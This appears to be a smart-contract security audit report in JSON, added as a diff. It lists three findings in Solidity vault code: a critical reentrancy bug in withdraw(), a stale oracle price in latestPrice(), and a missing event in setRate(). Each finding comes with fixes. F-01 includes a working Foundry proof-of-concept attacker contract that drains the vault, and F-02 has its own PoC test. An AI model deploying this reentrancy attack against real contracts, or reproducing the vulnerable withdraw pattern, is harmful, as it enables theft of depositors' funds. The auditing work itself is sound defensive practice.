@@ -1,0 +1,55 @@
+{
+  "commit": "7c1e4b9a2d3f5068a1b2c3d4e5f60718293a4b5c",
+  "filesReviewed": [
+    "contracts/PriceFeed.sol",
+    "contracts/Vault.sol",
+    "contracts/InterestModel.sol"
+  ],
+  "findings": [
+    {
+      "id": "F-01",
+      "severity": "Critical",
+      "title": "withdraw() pays the caller before it lowers the caller's balance",
+      "file": "contracts/Vault.sol",
+      "lines": { "start": 88, "end": 93 },
+      "excerpt": "function withdraw(uint256 amount) external {\n    require(balances[msg.sender] >= amount, \"balance too low\");\n    (bool sent, ) = msg.sender.call{value: amount}(\"\");\n    require(sent, \"send failed\");\n    balances[msg.sender] -= amount;\n}",
+      "rootCause": "withdraw() sends ether to the caller on line 90 and lowers balances[msg.sender] only on line 92. The caller's receive function runs between the two statements, while the vault still records the old balance.",
+      "impact": "A contract that calls withdraw() again from its receive function passes the balance check on every nested call and is paid each time. Any depositor can drain the ether of all other depositors in one transaction.",
+      "recommendedFix": "Lower balances[msg.sender] before the external call, and add a reentrancy guard to withdraw().",
+      "pocFiles": [
+        {
+          "path": "test/poc/F-01-reenter-withdraw.t.sol",
+          "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {Vault} from \"../../contracts/Vault.sol\";\n\ncontract Reenter {\n    Vault private immutable vault;\n\n    constructor(Vault v) payable {\n        vault = v;\n    }\n\n    function run() external {\n        vault.deposit{value: 1 ether}();\n        vault.withdraw(1 ether);\n    }\n\n    receive() external payable {\n        if (address(vault).balance >= 1 ether) vault.withdraw(1 ether);\n    }\n}\n\ncontract ReenterWithdrawTest is Test {\n    function test_depositorDrainsVault() public {\n        Vault vault = new Vault();\n        vm.deal(address(this), 10 ether);\n        vault.deposit{value: 10 ether}();\n        Reenter attacker = new Reenter{value: 1 ether}(vault);\n        attacker.run();\n        assertEq(address(vault).balance, 0);\n        assertEq(address(attacker).balance, 11 ether);\n    }\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "F-02",
+      "severity": "Medium",
+      "title": "latestPrice() returns an answer of any age",
+      "file": "contracts/PriceFeed.sol",
+      "lines": { "start": 41, "end": 45 },
+      "excerpt": "function latestPrice() external view returns (uint256) {\n    (, int256 answer, , uint256 updatedAt, ) = source.latestRoundData();\n    require(answer > 0, \"bad price\");\n    return uint256(answer);\n}",
+      "rootCause": "latestPrice() reads updatedAt on line 42 and never compares it with block.timestamp, so it returns an answer of any age as the current price.",
+      "impact": "While the source is delayed, the vault opens and liquidates loans at an old price. The loss on each loan is bounded by the price move during the delay.",
+      "recommendedFix": "Revert when block.timestamp - updatedAt is greater than a maximum age fixed at deployment.",
+      "pocFiles": [
+        {
+          "path": "test/poc/F-02-stale-price.t.sol",
+          "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {PriceFeed} from \"../../contracts/PriceFeed.sol\";\nimport {FixedSource} from \"../mocks/FixedSource.sol\";\n\ncontract StalePriceTest is Test {\n    function test_dayOldAnswerIsReturned() public {\n        FixedSource source = new FixedSource(2000e8, block.timestamp);\n        PriceFeed feed = new PriceFeed(source);\n        vm.warp(block.timestamp + 1 days);\n        assertEq(feed.latestPrice(), 2000e8);\n    }\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "F-03",
+      "severity": "Low",
+      "title": "setRate() changes the rate without an event",
+      "file": "contracts/InterestModel.sol",
+      "lines": { "start": 63, "end": 65 },
+      "excerpt": "function setRate(uint256 newRateBps) external onlyGovernor {\n    rateBps = newRateBps;\n}",
+      "rootCause": "setRate() writes rateBps on line 64 and emits no event, so a rate change leaves no log entry.",
+      "impact": "Indexers and depositors learn of a rate change only by reading storage. No funds are at risk.",
+      "recommendedFix": "Emit RateChanged(oldRateBps, newRateBps) from setRate()."
+    }
+  ]
+}
